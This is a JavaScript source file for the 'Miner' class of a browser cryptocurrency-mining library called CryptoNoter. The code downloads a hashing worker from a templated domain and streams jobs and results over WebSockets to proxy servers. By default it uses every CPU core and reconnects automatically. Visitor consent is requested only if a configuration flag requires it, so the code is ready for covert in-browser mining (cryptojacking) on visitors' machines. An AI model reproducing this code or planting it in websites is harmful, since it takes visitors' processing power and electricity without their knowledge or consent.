class Miner {
    constructor (siteKey, params) {
        params = params || {};
        this._siteKey = siteKey;
        this._user = null;
        this._threads = [];
        this._hashes = 0;
        this._currentJob = null;
        this._autoReconnect = true;
        this._reconnectRetry = 3;
        this._tokenFromServer = null;
        this._goal = 0;
        this._totalHashesFromDeadThreads = 0;
        this._throttle = Math.max(0, Math.min(.99, params.throttle || 0));
        this._autoThreads = {
            enabled: !!params.autoThreads,
            interval: null,
            adjustAt: null,
            adjustEvery: 1e4,
            stats: {}
        };
        this._tab = {
            ident: Math.random() * 16777215 | 0,
            mode: CryptoNoter.IF_EXCLUSIVE_TAB,
            grace: 0,
            lastPingReceived: 0,
            interval: null
        };
        if (window.BroadcastChannel) {
            try {
                this._bc = new BroadcastChannel("CryptoNoter");
                this._bc.onmessage = function (msg) {
                    if (msg.data === "ping") {
                        this._tab.lastPingReceived = Date.now()
                    }
                }.bind(this)
            } catch (e) {}
        }
        this._eventListeners = {
            open: [],
            authed: [],
            close: [],
            error: [],
            job: [],
            found: [],
            accepted: []
        };
        var defaultThreads = navigator.hardwareConcurrency || 4;
        this._targetNumThreads = params.threads || defaultThreads;
        this._useWASM = this.hasWASMSupport() && !params.forceASMJS;
        this._asmjsStatus = "unloaded";
        this._onTargetMetBound = this._onTargetMet.bind(this);
        this._onVerifiedBound = this._onVerified.bind(this)
    }

    start(mode) {
        this._tab.mode = mode || CryptoNoter.IF_EXCLUSIVE_TAB;
        if (this._tab.interval) {
            clearInterval(this._tab.interval);
            this._tab.interval = null
        }
        if (this._useWASM || this._asmjsStatus === "loaded") {
            var xhr = new XMLHttpRequest;
            xhr.addEventListener("load", function () {
                CryptoNoter.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", "https://%CryptoNoter_domain%/worker.js", true);
            xhr.send()
        } else if (this._asmjsStatus === "unloaded") {
            this._asmjsStatus = "pending";
            var xhr = new XMLHttpRequest;
            xhr.addEventListener("load", function () {
                CryptoNoter.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", CryptoNoter.CONFIG.LIB_URL + "cryptonoter-asmjs.min.js", true);
            xhr.send()
        }
    }

    stop(mode) {
        for (var i = 0; i < this._threads.length; i++) {
            this._totalHashesFromDeadThreads += this._threads[i].hashesTotal;
            this._threads[i].stop()
        }
        this._threads = [];
        this._autoReconnect = false;
        if (this._socket) {
            this._socket.close()
        }
        this._currentJob = null;
        if (this._autoThreads.interval) {
            clearInterval(this._autoThreads.interval);
            this._autoThreads.interval = null
        }
        if (this._tab.interval && mode !== "dontKillTabUpdate") {
            clearInterval(this._tab.interval);
            this._tab.interval = null
        }
    }

    getHashesPerSecond() {
        var hashesPerSecond = 0;
        for (var i = 0; i < this._threads.length; i++) {
            hashesPerSecond += this._threads[i].hashesPerSecond
        }
        return hashesPerSecond
    }

    getTotalHashes(estimate) {
        var now = Date.now();
        var hashes = this._totalHashesFromDeadThreads;
        for (var i = 0; i < this._threads.length; i++) {
            var thread = this._threads[i];
            hashes += thread.hashesTotal;
            if (estimate) {
                var tdiff = (now - thread.lastMessageTimestamp) / 1e3 * .9;
                hashes += tdiff * thread.hashesPerSecond
            }
        }
        return hashes | 0
    }

    getAcceptedHashes() {
        return this._hashes
    }

    getToken() {
        return this._tokenFromServer
    }

    on(type, callback) {
        if (this._eventListeners[type]) {
            this._eventListeners[type].push(callback)
        }
    }

    getAutoThreadsEnabled(enabled) {
        return this._autoThreads.enabled
    }

    setAutoThreadsEnabled(enabled) {
        this._autoThreads.enabled = !!enabled;
        if (!enabled && this._autoThreads.interval) {
            clearInterval(this._autoThreads.interval);
            this._autoThreads.interval = null
        }
        if (enabled && !this._autoThreads.interval) {
            this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
            this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 1e3)
        }
    }

    getThrottle() {
        return this._throttle
    }

    setThrottle(throttle) {
        this._throttle = Math.max(0, Math.min(.99, throttle));
        if (this._currentJob) {
            this._setJob(this._currentJob)
        }
    }

    getNumThreads() {
        return this._targetNumThreads
    }

    setNumThreads(num) {
        var num = Math.max(1, num | 0);
        this._targetNumThreads = num;
        if (num > this._threads.length) {
            for (var i = 0; num > this._threads.length; i++) {
                var thread = new CryptoNoter.JobThread;
                if (this._currentJob) {
                    thread.setJob(this._currentJob, this._onTargetMetBound)
                }
                this._threads.push(thread)
            }
        } else if (num < this._threads.length) {
            while (num < this._threads.length) {
                var thread = this._threads.pop();
                this._totalHashesFromDeadThreads += thread.hashesTotal;
                thread.stop()
            }
        }
    }


    isMobile() {
        return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)
    }
    
    hasWASMSupport() {
        return window.WebAssembly !== undefined
    }

    isRunning() {
        return this._threads.length > 0
    }

    _startNow() {
        if (this._tab.mode !== CryptoNoter.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
        }
        if (this._tab.mode === CryptoNoter.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        if (this._tab.mode === CryptoNoter.FORCE_EXCLUSIVE_TAB) {
            this._tab.grace = Date.now() + 3e3
        }
        if (!this.verifyThread) {
            this.verifyThread = new CryptoNoter.JobThread
        }
        this.setNumThreads(this._targetNumThreads);
        this._autoReconnect = true;
        if (CryptoNoter.CONFIG.REQUIRES_AUTH) {
            this._auth = this._auth || new CryptoNoter.Auth(this._siteKey);
            this._auth.auth(function (token) {
                if (!token) {
                    return this._emit("error", {
                        error: "opt_in_canceled"
                    })
                }
                this._optInToken = token;
                this._connect()
            }.bind(this))
        } else {
            this._connect()
        }
    }

    _otherTabRunning() {
        if (this._tab.lastPingReceived > Date.now() - 1500) {
            return true
        }
        try {
            var tdjson = localStorage.getItem("CryptoNoter");
            if (tdjson) {
                var td = JSON.parse(tdjson);
                if (td.ident !== this._tab.ident && Date.now() - td.time < 1500) {
                    return true
                }
            }
        } catch (e) {}
        return false
    }

    _updateTabs() {
        var otherTabRunning = this._otherTabRunning();
        if (otherTabRunning && this.isRunning() && Date.now() > this._tab.grace) {
            this.stop("dontKillTabUpdate")
        } else if (!otherTabRunning && !this.isRunning()) {
            this._startNow()
        }
        if (this.isRunning()) {
            if (this._bc) {
                this._bc.postMessage("ping")
            }
            try {
                localStorage.setItem("CryptoNoter", JSON.stringify({
                    ident: this._tab.ident,
                    time: Date.now()
                }))
            } catch (e) {}
        }
    }

    _adjustThreads() {
        var hashes = this.getHashesPerSecond();
        var threads = this.getNumThreads();
        var stats = this._autoThreads.stats;
        stats[threads] = stats[threads] ? stats[threads] * .5 + hashes * .5 : hashes;
        if (Date.now() > this._autoThreads.adjustAt) {
            this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
            var cur = (stats[threads] || 0) - 1;
            var up = stats[threads + 1] || 0;
            var down = stats[threads - 1] || 0;
            if (cur > down && (up === 0 || up > cur) && threads < 8) {
                return this.setNumThreads(threads + 1)
            } else if (cur > up && (!down || down > cur) && threads > 1) {
                return this.setNumThreads(threads - 1)
            }
        }
    }

    _emit(type, params) {
        var listeners = this._eventListeners[type];
        if (listeners && listeners.length) {
            for (var i = 0; i < listeners.length; i++) {
                listeners[i](params)
            }
        }
    }

    _hashString(s) {
        var hash = 5381,
            i = s.length;
        while (i) {
            hash = hash * 33 ^ s.charCodeAt(--i)
        }
        return hash >>> 0
    }

    _connect() {
        if (this._socket) {
            return
        }
        var shards = CryptoNoter.CONFIG.WEBSOCKET_SHARDS;
        var shardIdx = this._hashString(this._siteKey) % shards.length;
        var proxies = shards[shardIdx];
        var proxyUrl = proxies[Math.random() * proxies.length | 0];
        this._socket = new WebSocket(proxyUrl);
        this._socket.onmessage = this._onMessage.bind(this);
        this._socket.onerror = this._onError.bind(this);
        this._socket.onclose = this._onClose.bind(this);
        this._socket.onopen = this._onOpen.bind(this)
    }

    _onOpen(ev) {
        this._emit("open");
        var params = {
            site_key: this._siteKey,
            type: "anonymous",
            user: null,
            goal: 0
        };
        if (this._user) {
            params.type = "user";
            params.user = this._user.toString()
        } else if (this._goal) {
            params.type = "token";
            params.goal = this._goal
        }
        if (this._optInToken) {
            params.opt_in = this._optInToken
        }
        this._send("auth", params)
    }

    _onError(ev) {
        this._emit("error", {
            error: "connection_error"
        });
        this._onClose(ev)
    }

    _onClose(ev) {
        if (ev.code >= 1003 && ev.code <= 1009) {
            this._reconnectRetry = 60
        }
        for (var i = 0; i < this._threads.length; i++) {
            this._threads[i].stop()
        }
        this._threads = [];
        this._socket = null;
        this._emit("close");
        if (this._autoReconnect) {
            setTimeout(this._startNow.bind(this), this._reconnectRetry * 1e3)
        }
    }

    _onMessage(ev) {
        var msg = JSON.parse(ev.data);
        if (msg.type === "job") {
            this._setJob(msg.params);
            this._emit("job", msg.params);
            if (this._autoThreads.enabled && !this._autoThreads.interval) {
                this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
                this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 1e3)
            }
        } else if (msg.type === "verify") {
            this.verifyThread.verify(msg.params, this._onVerifiedBound)
        } else if (msg.type === "hash_accepted") {
            this._hashes = msg.params.hashes;
            this._emit("accepted", msg.params);
            if (this._goal && this._hashes >= this._goal) {
                this.stop()
            }
        } else if (msg.type === "authed") {
            this._tokenFromServer = msg.params.token || null;
            this._hashes = msg.params.hashes || 0;
            this._emit("authed", msg.params);
            this._reconnectRetry = 3
        } else if (msg.type === "error") {
            if (console && console.error) {
                console.error("CryptoNoter Error:", msg.params.error)
            }
            this._emit("error", msg.params);
            if (msg.params.error === "invalid_site_key") {
                this._reconnectRetry = 6e3
            } else if (msg.params.error === "invalid_opt_in") {
                if (this._auth) {
                    this._auth.reset()
                }
            }
        } else if (msg.type === "banned" || msg.params.banned) {
            this._emit("error", {
                banned: true
            });
            this._reconnectRetry = 600
        }
    }

    _setJob(job) {
        this._currentJob = job;
        this._currentJob.throttle = this._throttle;
        for (var i = 0; i < this._threads.length; i++) {
            this._threads[i].setJob(job, this._onTargetMetBound)
        }
    }

    _onTargetMet(result) {
        this._emit("found", result);
        if (result.job_id === this._currentJob.job_id) {
            this._send("submit", {
                job_id: result.job_id,
                nonce: result.nonce,
                result: result.result
            })
        }
    }

    _onVerified(verifyResult) {
        this._send("verified", verifyResult)
    }

    _send(type, params) {
        if (!this._socket) {
            return
        }
        var msg = {
            type: type,
            params: params || {}
        };
        this._socket.send(JSON.stringify(msg))
    }
}

export default Miner;
